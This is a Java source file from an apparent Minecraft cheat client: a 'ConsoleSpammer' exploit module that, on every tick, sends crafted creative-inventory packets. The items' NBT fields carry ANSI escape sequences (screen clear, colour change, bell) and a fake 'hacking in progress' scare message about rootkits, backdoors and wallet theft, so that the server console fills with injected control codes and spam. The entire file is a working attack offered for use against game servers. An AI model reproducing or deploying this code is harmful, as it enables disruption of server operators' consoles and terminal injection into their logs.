package me.nekosarekawaii.foxglove.feature.impl.module.impl.exploit.modes.consolespammer;

import de.florianmichael.dietrichevents2.DietrichEvents2;
import me.nekosarekawaii.foxglove.Foxglove;
import me.nekosarekawaii.foxglove.event.TickListener;
import me.nekosarekawaii.foxglove.feature.impl.module.ModuleMode;
import me.nekosarekawaii.foxglove.feature.impl.module.impl.exploit.ConsoleSpammerModule;
import me.nekosarekawaii.foxglove.util.timer.impl.ms.MsTimer;
import me.nekosarekawaii.foxglove.value.Value;
import me.nekosarekawaii.foxglove.value.values.ListValue;
import net.minecraft.client.network.ClientPlayNetworkHandler;
import net.minecraft.client.network.ClientPlayerEntity;
import net.minecraft.client.network.ClientPlayerInteractionManager;
import net.minecraft.client.world.ClientWorld;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtString;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;

public class ItemModuleMode extends ModuleMode<ConsoleSpammerModule> implements TickListener {

    private final Value<String> item = new ListValue(
            "Item",
            "The item mode.",
            this.getParent(),
            "Entity",
            "ItemFrame"
    ).visibleConsumer(() -> this.getParent().mode.getValue().equals(this.getName()));

    public ItemModuleMode(final ConsoleSpammerModule parent) {
        super("Item", parent);
    }

    @Override
    public void onEnable() {
        DietrichEvents2.global().subscribe(TickListener.TickEvent.ID, this);
    }

    @Override
    public void onDisable() {
        DietrichEvents2.global().unsubscribe(TickListener.TickEvent.ID, this);
    }

    private int currentPercent = 0;
    private final MsTimer percentTimer = new MsTimer();

    private final static String title =
            "888    888        d8888  .d8888b.  888    d8P  8888888888 8888888b.  \n" +
                    "888    888       d88888 d88P  Y88b 888   d8P   888        888  \"Y88b \n" +
                    "888    888      d88P888 888    888 888  d8P    888        888    888 \n" +
                    "8888888888     d88P 888 888        888d88K     8888888    888    888 \n" +
                    "888    888    d88P  888 888        8888888b    888        888    888 \n" +
                    "888    888   d88P   888 888    888 888  Y88b   888        888    888 \n" +
                    "888    888  d8888888888 Y88b  d88P 888   Y88b  888        888  .d88P \n" +
                    "888    888 d88P     888  \"Y8888P\"  888    Y88b 8888888888 8888888P\"\n" +

                    "\n[" + Foxglove.getInstance().getName() + " made by Lucy HÃ¶rner." + "]\n\n";

    private StringBuilder trollMsg = new StringBuilder(title);

    @Override
    public void onTick() {
        final ClientWorld world = mc.world;
        final ClientPlayerEntity player = mc.player;
        final ClientPlayNetworkHandler networkHandler = mc.getNetworkHandler();
        final ClientPlayerInteractionManager interactionManager = mc.interactionManager;
        if (world == null || player == null || networkHandler == null || interactionManager == null) {
            this.getParent().setState(false);
            return;
        }

        if (this.percentTimer.hasReached(100, true)) {
            this.currentPercent++;
            this.trollMsg.append("> ");
            if (this.currentPercent > 0 && this.currentPercent <= 10) {
                this.trollMsg.append("Cracking hashes");
            } else if (this.currentPercent > 10 && this.currentPercent <= 20) {
                this.trollMsg.append("Searching for important files");
            } else if (this.currentPercent > 20 && this.currentPercent <= 30) {
                this.trollMsg.append("Decrypting password hashes using hash executor");
            } else if (this.currentPercent > 30 && this.currentPercent <= 40) {
                this.trollMsg.append("Installing root kit");
            } else if (this.currentPercent > 40 && this.currentPercent <= 50) {
                this.trollMsg.append("Installing backdoor");
            } else if (this.currentPercent > 50 && this.currentPercent <= 60) {
                this.trollMsg.append("Installing doom eternal");
            } else if (this.currentPercent > 60 && this.currentPercent <= 65) {
                this.trollMsg.append("Installing admin evil Hack");
            } else if (this.currentPercent > 65 && this.currentPercent <= 70) {
                this.trollMsg.append("Bruteforcing remote endpoint");
            } else if (this.currentPercent > 70 && this.currentPercent <= 80) {
                this.trollMsg.append("Spawning hot minecraft e-girls");
            } else if (this.currentPercent > 80 && this.currentPercent <= 99) {
                this.trollMsg.append("Stealing bitcoin wallet");
            } else {
                this.currentPercent = 0;
                this.trollMsg = new StringBuilder(title);
            }
            if (this.currentPercent > 0) {
                this.trollMsg.append(" ");
                this.trollMsg.append(this.currentPercent);
                this.trollMsg.append("% ...");
                this.trollMsg.append('\n');
            }
        }
        ItemStack stack = null;
        final NbtCompound nbt = new NbtCompound();
        final NbtCompound entitytag = new NbtCompound();
        final String fun = "\033c\u001b[32m" + "\n".repeat(10) + this.trollMsg + "\n\u0007";
        switch (this.item.getValue()) {
            case "Entity" -> {
                stack = new ItemStack(Items.BAT_SPAWN_EGG);
                entitytag.put("transformation", NbtString.of(fun));
                entitytag.putString("id", "minecraft:text_display");
                nbt.put("EntityTag", entitytag);
            }
            case "ItemFrame" -> {
                stack = new ItemStack(Items.ITEM_FRAME);
                final NbtCompound itemNbt = new NbtCompound();
                itemNbt.putString("id", fun);
                entitytag.put("Item", itemNbt);
                entitytag.putByte("Fixed", (byte) 1);
                entitytag.putByte("Invisible", (byte) 1);
                entitytag.putByte("Silent", (byte) 1);
                entitytag.putByte("Invulnerable", (byte) 1);
                nbt.put("EntityTag", entitytag);
            }
            default -> {
            }
        }
        if (stack != null) {
            stack.setNbt(nbt);
            mc.getNetworkHandler().sendPacket(new CreativeInventoryActionC2SPacket(36 + player.getInventory().selectedSlot, stack));
            mc.doItemUse();
        }
    }

}
